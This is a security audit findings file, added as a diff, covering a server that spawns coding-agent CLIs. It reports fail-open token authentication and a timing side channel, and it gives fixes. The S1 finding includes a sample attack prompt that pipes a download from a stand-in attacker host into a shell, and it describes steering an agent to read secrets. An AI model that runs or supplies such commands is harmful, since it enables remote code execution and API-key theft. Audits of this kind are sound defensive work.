@@ -1,0 +1,19 @@
+# 05 — Security-CSO (OWASP + STRIDE findings)
+
+2 findings, raw (pre-filter). Both target the HTTP auth path. Verification outcomes are cross-referenced in `07-filtered.md` — note the filter treated the fail-open finding (S1) as a documented, intentional posture and dropped it, while confirming the timing side-channel (S2) at low severity.
+
+## S1 — Fail-open authentication on an arbitrary-code-execution endpoint
+- **Severity:** High
+- **file:line:** `src/httpServer.ts:58-64` (with `Dockerfile:38` `ENV HOST=0.0.0.0`)
+- **STRIDE / OWASP:** Spoofing / Elevation of Privilege; OWASP A01 Broken Access Control, A05 Security Misconfiguration; CWE-306 Missing Authentication for Critical Function.
+- **Problem:** The POST `/mcp` endpoint registers tools (codex/cursor/claude/opencode/run_all) that spawn autonomous coding-agent CLIs. Those agents execute arbitrary code, write files, and hold the container's `OPENAI_API_KEY` / `CURSOR_API_KEY` / `ANTHROPIC_API_KEY`, with a caller-controlled cwd. Authentication is entirely optional: `const token = process.env.MCP_TOKEN; if (token && ...)` — when `MCP_TOKEN` is unset the check is skipped and every request is accepted. The runtime image sets `ENV HOST=0.0.0.0`, so any operator publishing the port without the loopback restriction (e.g. `docker run -p 3919:3919 ...`) and without `MCP_TOKEN` exposes unauthenticated remote code execution and credential theft. Concrete path: attacker POSTs a JSON-RPC `tools/call` for `codex` with prompt "run `curl attacker/x|sh`" (or cwd `/root` + a prompt to read secrets) → agent executes it on the host with the server's credentials.
+- **Fix:** Fail closed. When binding a non-loopback host, require `MCP_TOKEN` and refuse to start without it (throw in `startHttpServer` before `listen` if host not in `LOOPBACK_HOSTNAMES` and `!process.env.MCP_TOKEN`). Do not default `HOST` to `0.0.0.0` in the Dockerfile; keep `127.0.0.1` and document that exposing the port requires both `MCP_TOKEN` and a TLS proxy. Optionally always require the token.
+- **Filter note:** Verifier marked this NOT a blocking defect (real=false, 72%): the posture is intentional and documented — docker-compose publishes loopback-only with an explicit warning, the Dockerfile comment explains the in-container `0.0.0.0` bind, and `docs/feature-plan/00-shape.md` explicitly rejects fail-closed auth as disproportionate for a local single-user hub. Exploitation requires the operator to bypass shipped defaults. The fail-closed-on-non-loopback startup check remains a reasonable low/info hardening suggestion. (The Red team's overlapping R1 was kept as NEEDS-HUMAN with a severity downgrade to medium.)
+
+## S2 — Non-constant-time bearer-token comparison (timing side channel)
+- **Severity:** Low
+- **file:line:** `src/httpServer.ts:59`
+- **STRIDE / OWASP:** Information Disclosure; OWASP A02 Cryptographic Failures; CWE-208 Observable Timing Discrepancy.
+- **Problem:** The token check uses JS string inequality, which short-circuits on the first differing byte and so takes token-value-dependent time. In principle this leaks the secret byte-by-byte to an attacker able to measure response timing. Genuine remote exploitability is limited (network jitter typically swamps the signal for a high-entropy secret), so this is hardening / defense-in-depth rather than a confirmed remote exploit — but it is a clear deviation from secure-comparison best practice on an auth path guarding RCE.
+- **Fix:** Use a constant-time primitive: `import { timingSafeEqual } from "node:crypto"`, encode both expected `Bearer <token>` and received header to Buffers, return false first if lengths differ, else `timingSafeEqual(a, b)`. Reject non-string/array authorization headers explicitly.
+- **Filter note:** Confirmed (real=true, low severity). This is the same defect independently reported by Red (R2) and Green (G9); merged in the Purple report as item 9.
